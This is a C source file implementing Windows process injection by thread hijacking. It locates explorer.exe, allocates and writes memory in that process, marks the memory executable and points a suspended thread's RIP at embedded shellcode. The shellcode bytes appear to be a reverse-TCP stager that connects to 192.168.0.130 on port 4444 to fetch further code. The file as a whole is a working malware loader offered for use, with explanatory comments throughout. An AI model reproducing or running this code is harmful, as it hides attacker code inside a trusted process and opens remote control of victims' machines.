#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h> //this library provides functions and data structures for enumerating and manipulating processes, threads, and modules in a system.
#include <winbase.h>

void displayErrorMessage(DWORD errorCode) {
	LPSTR messageBuffer = NULL;
	FormatMessageA(
		FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		errorCode,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPSTR)&messageBuffer,
		0,
		NULL);

	if (messageBuffer != NULL) {
		printf("Error: %s\n", messageBuffer);
		LocalFree(messageBuffer);
	}
	else {
		printf("Error: Unable to get error message for code %d\n", errorCode);
	}
}

BOOL InjectShellcode(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {
	SIZE_T sNumberOfBytesWritten = NULL;
	DWORD dwOldProtection = NULL;

	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); //reserver memory
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n");
		displayErrorMessage(GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);

	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) { //write memory to reserver space
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n");
		displayErrorMessage(GetLastError());
		return FALSE;
	}
	printf("[+] WriteProcessMemory\n");
	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) { //Changes the protection on a region of committed pages
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n");
		displayErrorMessage(GetLastError());
		return FALSE;
	}
	printf("[+] VirtualProtectEx\n");
	return TRUE;

}

BOOL GetProcess(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
	PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) }; //initialize Proc with specified .dwSize member value 
	HANDLE hSnapShot = NULL;

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL); //The snapshot is essentially a static view of the system at the time the function is called, including information about running processes, threads, and modules.
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		displayErrorMessage(GetLastError());
		return FALSE;
	}
	printf("[+] hSnapShot\n");
	if (!Process32First(hSnapShot, &Proc)) { //information about first process encountered in a snapshot
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		displayErrorMessage(GetLastError());
		CloseHandle(hSnapShot);
		return FALSE;
	}
	printf("[+] Process32First\n");
	while (Process32Next(hSnapShot, &Proc)) { //while next process in a snapshot exists check if its name is equal to specified as argument to the function. If so obtain its ID and handle and end loop
		WCHAR LowerName[MAX_PATH * 2]; //name
		if (Proc.szExeFile) { //string that represents the name of the executable file associated with the process
			DWORD dwSize = lstrlenW(Proc.szExeFile); //calculate the length of a Unicode string
			DWORD i = 0;

			

			if (dwSize < MAX_PATH * 2) { //ensure that name is lowercase
				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]); 
				LowerName[i++] = '\0';
			}
			if (wcscmp(LowerName, szProcessName) == 0) { //compare two string
				*dwProcessId = Proc.th32ProcessID;// Save the PID			
				*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);// Open a handle to the process
				if (*hProcess == NULL) {
					printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
					displayErrorMessage(GetLastError());
					CloseHandle(hSnapShot);
					return FALSE;
				}
				break;
			}
		}
	}

	printf("[+] GetProcess Finish\n");

	CloseHandle(hSnapShot);
	return TRUE;
}

BOOL GetRemoteThreadhandle(IN DWORD dwProcessId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {
	HANDLE hSnapShot = NULL;
	THREADENTRY32 Thr = { .dwSize = sizeof(THREADENTRY32) }; //initialize Thr with specified .dwSize member value 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL); //The snapshot is essentially a static view of the system at the time the function is called, including information about running processes, threads, and modules.
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\n\t[!] CreateToolhelp32Snapszot Failed With Error: %d \n", GetLastError());
		displayErrorMessage(GetLastError());
		return FALSE;
	}
	printf("[+] hSnapShot in thread\n");
	if (!Thread32First(hSnapShot, &Thr)) { //information about the first thread encountered in a snapshot
		printf("\n\t[!] Thread32First Failed With Error : %d \n", GetLastError());
		displayErrorMessage(GetLastError());
		CloseHandle(hSnapShot);
		return FALSE;
	}
	printf("[+] Thread32First\n");
	while (Thread32Next(hSnapShot, &Thr)) { //while next thread in a snapshot exists check if it's owner's processId is the id of desired process. 
		if (Thr.th32OwnerProcessID == dwProcessId) {
			*dwThreadId = Thr.th32ThreadID; //save TID
			*hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID); //obtain the handle to the thread
			if (*hThread == NULL) {
				printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());
				displayErrorMessage(GetLastError());
				CloseHandle(hSnapShot);
				return FALSE;
			}
			break;
		}
	}
	printf("[+] GetRemoteThreadhandle Finish\n");
	CloseHandle(hSnapShot);
	return TRUE;
}

BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
	CONTEXT ThreadCtx = {.ContextFlags = CONTEXT_ALL}; //initialise ThreadCtx of type context with .ContextFkags = CONTEXT_ALL
	// Suspend the thread
	SuspendThread(hThread); //Suspend Thread

	if (!GetThreadContext(hThread, &ThreadCtx)) { //retrive context of a thread. It's recived by ThreadCtx
		printf("\t[!] GetThreadContext Failed With Error : %d \n");
		displayErrorMessage(GetLastError());
		return FALSE;
	}
	ThreadCtx.Rip = pAddress; //update rip inside ThreadCtx with the address of the next instructoin. RIP register is an Instruction Pointer
	if (!SetThreadContext(hThread, &ThreadCtx)) { //set thread context with updated ThreadCtx
		printf("\t[!] SetThreadContext Failed With Error : %d \n");
		displayErrorMessage(GetLastError());
		return FALSE;
	}
	ResumeThread(hThread); //Resume Thread
	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}


int main() {

	LPWSTR lpProcessName = L"explorer.exe";
	DWORD dwProcessId;
	HANDLE hProcess;
	DWORD dwThreadId;
	HANDLE hThread;
	PVOID pAddress;
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48"
		"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41"
		"\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
		"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
		"\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x50\x8b\x48\x18\x49"
		"\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x4d\x31\xc9"
		"\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
		"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
		"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
		"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
		"\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
		"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
		"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
		"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
		"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x00\x82\x41\x54"
		"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
		"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
		"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
		"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
		"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
		"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
		"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
		"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
		"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
		"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
		"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
		"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
		"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
		"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
		"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
		"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
		"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
		"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
		"\x2a\x0a\x41\x89\xda\xff\xd5";


	GetProcess(lpProcessName, &dwProcessId, &hProcess);
	GetRemoteThreadhandle(dwProcessId, &dwThreadId, &hThread);
	InjectShellcode(hProcess, shellcode, sizeof(shellcode), &pAddress);
	HijackThread(hThread, pAddress);


	return 0;
}